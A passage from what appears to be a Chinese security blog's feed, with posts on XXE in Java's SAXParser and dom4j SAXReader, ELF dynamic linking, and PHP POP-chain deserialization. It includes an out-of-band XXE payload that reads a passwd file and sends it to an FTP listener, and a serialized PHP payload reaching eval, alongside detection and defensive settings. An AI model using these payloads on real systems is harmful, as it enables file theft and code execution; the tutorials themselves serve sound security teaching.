检测方法</h2><p>1、在Java项目中搜索javax.xml.parsers下的SAXParser和SAXParserFactory，排查是否使用了该API解析XML文档内容；</p><p>2、若使用了，则进一步排查是否禁用了不安全的操作，具体的是看setFeature()的设置是否存在绕过的可能；</p><h2 id="0x05-防御方法"><a href="#0x05-防御方法" class="headerlink" title="0x05 防御方法"></a>0x05 防御方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">saxParser.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">saxParser.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">saxParser.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">saxParser.setFeature(<span class="string">"http://apache.org/xml/features/nonvalidating/load-external-dtd"</span>, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://Mi1k7ea.github.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://Mi1k7ea.github.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://Mi1k7ea.github.com/tags/Java/"/>
    
      <category term="XML注入" scheme="https://Mi1k7ea.github.com/tags/XML%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>XML注入之SAXReader</title>
    <link href="https://Mi1k7ea.github.com/2019/05/24/XML%E6%B3%A8%E5%85%A5%E4%B9%8BSAXReader/"/>
    <id>https://Mi1k7ea.github.com/2019/05/24/XML注入之SAXReader/</id>
    <published>2019-05-24T13:42:39.000Z</published>
    <updated>2019-05-28T14:15:59.666Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-何为SAXReader"><a href="#0x01-何为SAXReader" class="headerlink" title="0x01 何为SAXReader"></a>0x01 何为SAXReader</h2><p>官方描述：</p><blockquote><p>Flexible XML framework for Java. </p></blockquote><p>即灵活的Java XML框架，用于解析XML格式的内容。</p><h2 id="0x02-常规用法Demo"><a href="#0x02-常规用法Demo" class="headerlink" title="0x02 常规用法Demo"></a>0x02 常规用法Demo</h2><p>需要下载dom4j的jar包：<a href="https://dom4j.github.io/" target="_blank" rel="noopener">https://dom4j.github.io/</a></p><p>先定义一个user.xml，用于让DocumentBuilder来解析：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Mi1k7ea<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">sex</span>&gt;</span>male<span class="tag">&lt;/<span class="name">sex</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">age</span>&gt;</span>20<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Demo代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        File f = <span class="keyword">new</span> File(<span class="string">"user.xml"</span>);</span><br><span class="line">        saxReader(f);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">saxReader</span><span class="params">(File f)</span> <span class="keyword">throws</span> DocumentException</span>&#123;</span><br><span class="line">        SAXReader saxReader = <span class="keyword">new</span> SAXReader();</span><br><span class="line">        org.dom4j.Document d = saxReader.read(f);</span><br><span class="line">        Element root = d.getRootElement();</span><br><span class="line">        List&lt;Element&gt; childs = root.elements();</span><br><span class="line">        <span class="keyword">for</span> (Element child : childs)&#123;</span><br><span class="line">            String name = child.getName();</span><br><span class="line">            String text = child.getText();</span><br><span class="line">            System.out.println(name + <span class="string">":"</span> + text);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行后，发现成功解析了user.xml的内容：</p><p><img src="/2019/05/24/XML注入之SAXReader/1.png" alt=""></p><h2 id="0x03-XML注入漏洞验证"><a href="#0x03-XML注入漏洞验证" class="headerlink" title="0x03 XML注入漏洞验证"></a>0x03 XML注入漏洞验证</h2><p>具体的步骤参考之前的博客<a href="https://www.mi1k7ea.com/2019/02/13/XML%E6%B3%A8%E5%85%A5%E4%B9%8BDocumentBuilder/" target="_blank" rel="noopener">《XML注入之DocumentBuilder与XXE攻击防御》</a>，这里不再赘述。</p><p>下面只进行无回显外带OOB攻击Demo：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        File f = <span class="keyword">new</span> File(<span class="string">"ftp.xml"</span>);</span><br><span class="line">        saxReader(f);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">saxReader</span><span class="params">(File f)</span> <span class="keyword">throws</span> DocumentException</span>&#123;</span><br><span class="line">        SAXReader saxReader = <span class="keyword">new</span> SAXReader();</span><br><span class="line">        org.dom4j.Document d = saxReader.read(f);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ftp.xml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">        &lt;!ENTITY % file SYSTEM &quot;file:///e:/passwd&quot;&gt;</span><br><span class="line">        &lt;!ENTITY % remote SYSTEM &quot;http://127.0.0.1/xxe/ftp.dtd&quot;&gt;</span><br><span class="line">        %remote;</span><br><span class="line">        %all;</span><br><span class="line">        ]&gt;</span><br><span class="line">&lt;root&gt;&amp;send;&lt;/root&gt;</span><br></pre></td></tr></table></figure><p>ftp.dtd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &apos;ftp://127.0.0.1:21/%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>运行本地FTPServer接收数据：</p><p><img src="/2019/05/24/XML注入之SAXReader/2.png" alt=""></p><h2 id="0x04-检测方法"><a href="#0x04-检测方法" class="headerlink" title="0x04 检测方法"></a>0x04 检测方法</h2><p>1、在Java项目中搜索org.dom4j下的SAXReader，排查是否使用了该API解析XML文档内容；</p><p>2、若使用了，则进一步排查是否禁用了不安全的操作，具体的是看setFeature()的设置是否存在绕过的可能；</p><p>3、除了setFeature()的设置外，检查Reader在read()解析xml数据之前是否采用setEntityResolver()的方式来设置自定义实体解析方式；</p><h2 id="0x05-防御方法"><a href="#0x05-防御方法" class="headerlink" title="0x05 防御方法"></a>0x05 防御方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">saxReader.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">saxReader.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">saxReader.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">saxReader.setFeature(<span class="string">"http://apache.org/xml/features/nonvalidating/load-external-dtd"</span>, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://Mi1k7ea.github.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://Mi1k7ea.github.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://Mi1k7ea.github.com/tags/Java/"/>
    
      <category term="XML注入" scheme="https://Mi1k7ea.github.com/tags/XML%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>ELF动态链接,PLT和GOT</title>
    <link href="https://Mi1k7ea.github.com/2019/05/24/GOT%E8%A1%A8-PLT%E8%A1%A8%E4%B8%8E%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/"/>
    <id>https://Mi1k7ea.github.com/2019/05/24/GOT表-PLT表与动态链接/</id>
    <published>2019-05-24T13:41:27.000Z</published>
    <updated>2019-05-28T14:15:16.611Z</updated>
    
    <content type="html"><![CDATA[<p>当一个程序被加载进内存时，动态链接器会把需要的共享库加载并绑定到该进程的地址空间中。</p><p>共享库在被编译到可执行文件中时是位置独立的，因此很容易被重定位到进程的地址空间中。一个共享库就是一个动态的ELF目标文件。在终端输入readelf -h libc.so命令，会看到e_type（ELF文件类型）是ET_DYN。动态目标文件与可执行文件非常类似，是由程序解释器加载的，通常没有PT_INTERP段，因而不会触发程序解释器。</p><p>当一个共享库被加载进一个进程的地址空间中时，一定有指向其他共享库的重定位。动态链接器会修改可执行文件中的GOT（Global Offset Table全局偏移表）。GOT位于数据段中（.got.plt节），因为GOT必须是可写的（至少最初是可写的，可以将只读重定位看做是一种安全特性），因而位于数据段中。动态链接器会使用解析好的共享库地址来修改GOT。</p><h2 id="0x01-辅助向量"><a href="#0x01-辅助向量" class="headerlink" title="0x01 辅助向量"></a>0x01 辅助向量</h2><p>通过系统调用sys_execve()将程序加载到内存中时，对应的可执行文件会被映射到内存的地址空间，并为该进程的地址空间分配一个栈。这个栈会用特定的方式向动态链接器传递信息。这种特定的对信息的设置和安排即为辅助向量（auxv）。</p><p>如下x86结构中，占地存放了以下信息：</p><p><img src="/2019/05/24/GOT表-PLT表与动态链接/1.png" alt=""></p><p>辅助向量是一系列ElfN_auxv_t的结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> HAVE_ELF32_AUXV_T </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span> </span><br><span class="line">  <span class="keyword">uint32_t</span> a_type;<span class="comment">/* Entry type */</span> </span><br><span class="line">  <span class="keyword">union</span> </span><br><span class="line">    &#123; </span><br><span class="line">      <span class="keyword">uint32_t</span> a_val;<span class="comment">/* Integer value */</span> </span><br><span class="line">      <span class="comment">/* We use to have pointer elements added here.  We cannot do that, </span></span><br><span class="line"><span class="comment">though, since it does not work when using 32-bit definitions </span></span><br><span class="line"><span class="comment">on 64-bit platforms and vice versa.  */</span> </span><br><span class="line">    &#125; a_un; </span><br><span class="line">&#125; Elf32_auxv_t; </span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> HAVE_ELF64_AUXV_T </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span> </span><br><span class="line">  <span class="keyword">uint64_t</span> a_type;<span class="comment">/* Entry type */</span> </span><br><span class="line">  <span class="keyword">union</span> </span><br><span class="line">    &#123; </span><br><span class="line">      <span class="keyword">uint64_t</span> a_val;<span class="comment">/* Integer value */</span> </span><br><span class="line">      <span class="comment">/* We use to have pointer elements added here.  We cannot do that, </span></span><br><span class="line"><span class="comment">though, since it does not work when using 32-bit definitions </span></span><br><span class="line"><span class="comment">on 64-bit platforms and vice versa.  */</span> </span><br><span class="line">    &#125; a_un; </span><br><span class="line">&#125; Elf64_auxv_t; </span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>a_type指定了辅助向量的条目类型，a_val为辅助向量的值。</p><p>下面是动态链接器所需要的一些最重要的条目类型：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AT_EXECFD2<span class="comment">/* File descriptor of program */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AT_PHDR3<span class="comment">/* Program headers for program */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AT_PHENT4<span class="comment">/* Size of program header entry */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AT_PHNUM5<span class="comment">/* Number of program headers */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AT_PAGESZ6<span class="comment">/* System page size */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AT_ENTRY9<span class="comment">/* Entry point of program */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AT_UID11<span class="comment">/* Real uid */</span></span></span><br></pre></td></tr></table></figure><p>动态链接器从栈中检索可执行程序相关的信息，如程序头、程序入口地址等。上面列出的只是从/usr/include/elf.h中挑选出的几个辅助向量条目类型。</p><p>辅助向量是由内核函数create_elf_tables()设定的，该函数在Linux的源码/usr/src/linux/fs/binfmt_elf.c中。</p><p>内核的执行过程和如下描述类似：</p><ol><li>sys_execve()</li><li>调用do_execve_common()</li><li>调用search_binary_handler()</li><li>调用load_elf_binary()</li><li>调用create_elf_tables()</li></ol><p>下面是/usr/src/linux/fs/binfmt_elf.c中的函数create_elf_tables()的代码，这段代码会添加辅助向量条目：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">NEW_AUX_ENT(AT_PAGESZ, ELF_EXEC_PAGESIZE);</span><br><span class="line">NEW_AUX_ENT(AT_PHDR, load_addr + exec-&gt;e_phoff);</span><br><span class="line">NEW_AUX_ENT(AT_PHENT, <span class="keyword">sizeof</span> (struct elf_phdr));</span><br><span class="line">NEW_AUX_ENT(AT_PHNUM, exec-&gt;e_phnum);</span><br><span class="line">NEW_AUX_ENT(AT_BASE, interp_load_addr);</span><br><span class="line">NEW_AUX_ENT(AT_ENTRY, exec-&gt;e_entry);</span><br></pre></td></tr></table></figure><p>可以看到，ELF的入口点和程序头地址，以及其他的值，是与内核中的NEW_AUX_ENT()宏一起入栈的。</p><p>程序被加载进内存，辅助向量被填充好之后，控制权就交给了动态链接器。动态链接器会解析要链接到进程地址空间的用于共享库的符号和重定位。默认情况下，可执行文件会动态链接GNU C库libc.so。</p><p>ldd命令能显示出一个给定的可执行文件所依赖的共享库列表。</p><h2 id="0x02-GOT表和PLT表"><a href="#0x02-GOT表和PLT表" class="headerlink" title="0x02 GOT表和PLT表"></a>0x02 GOT表和PLT表</h2><p>…</p><h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2>]]></content>
    
    <summary type="html">
    
      未完待续...
    
    </summary>
    
      <category term="二进制基础" scheme="https://Mi1k7ea.github.com/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="二进制" scheme="https://Mi1k7ea.github.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
  </entry>
  
  <entry>
    <title>PHP对象注入之pop链构造</title>
    <link href="https://Mi1k7ea.github.com/2019/05/04/PHP%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5%E4%B9%8Bpop%E9%93%BE%E6%9E%84%E9%80%A0/"/>
    <id>https://Mi1k7ea.github.com/2019/05/04/PHP对象注入之pop链构造/</id>
    <published>2019-05-04T07:31:31.000Z</published>
    <updated>2019-05-28T14:17:03.489Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-pop链"><a href="#0x01-pop链" class="headerlink" title="0x01 pop链"></a>0x01 pop链</h2><p>我们知道，PHP反序列化漏洞的问题点是出在写得不安全的魔法函数上，有漏洞的魔法函数会让攻击者构造恶意的exp来触发，因为魔法函数会自动调用从而触发漏洞。</p><p><strong>但如果漏洞代码不在魔法方法中，而是在一个类的普通方法中，这时就可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来。因为PHP反序列化可以控制类属性，无论是private还是public。</strong></p><p>看个Demo就容易理解了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mi1k7ea</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $ClassObj;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ClassObj = <span class="keyword">new</span> normal();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ClassObj-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">normal</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"hello"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $data;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unserialize($_GET[<span class="string">'d'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>mi1k7ea这个类本来是调用normal类的，而normal类中含有action()方法用于显示字符串，但是现在action()方法在evil类里面也有，所以可以构造pop链，调用evil类中的action()方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mi1k7ea</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $ClassObj;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ClassObj = <span class="keyword">new</span> evil();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $data = <span class="string">"phpinfo();"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$m7 = <span class="keyword">new</span> mi1k7ea();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($m7));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>注意的是，protected $ClassObj = new evil();是不行的，还是通过__construct来实例化。</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A7%3A%22mi1k7ea%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00ClassObj%22%3BO%3A4%3A%22evil%22%3A1%3A%7Bs%3A10%3A%22%00evil%00data%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D</span><br></pre></td></tr></table></figure><p><img src="/2019/05/04/PHP对象注入之pop链构造/1.png" alt=""></p><h2 id="0x02-练习"><a href="#0x02-练习" class="headerlink" title="0x02 练习"></a>0x02 练习</h2><p>这里看一道pop链题目。</p><p>访问页面，显示源码，如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OutputFilter</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> $matchPattern;</span><br><span class="line">  <span class="keyword">protected</span> $replacement;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($pattern, $repl)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;matchPattern = $pattern;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;replacement = $repl;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="keyword">$this</span>-&gt;matchPattern, <span class="keyword">$this</span>-&gt;replacement, $data);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LogFileFormat</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> $filters;</span><br><span class="line">  <span class="keyword">protected</span> $endl;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filters, $endl)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;filters = $filters;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;endl = $endl;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">format</span><span class="params">($txt)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;filters <span class="keyword">as</span> $filter) &#123;</span><br><span class="line">      $txt = $filter-&gt;filter($txt);</span><br><span class="line">    &#125;</span><br><span class="line">    $txt = str_replace(<span class="string">'\n'</span>, <span class="keyword">$this</span>-&gt;endl, $txt);</span><br><span class="line">    <span class="keyword">return</span> $txt;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LogWriter_File</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> $filename;</span><br><span class="line">  <span class="keyword">protected</span> $format;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename, $format)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;filename = str_replace(<span class="string">".."</span>, <span class="string">"__"</span>, str_replace(<span class="string">"/"</span>, <span class="string">"_"</span>, $filename));</span><br><span class="line">    <span class="keyword">$this</span>-&gt;format = $format;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span 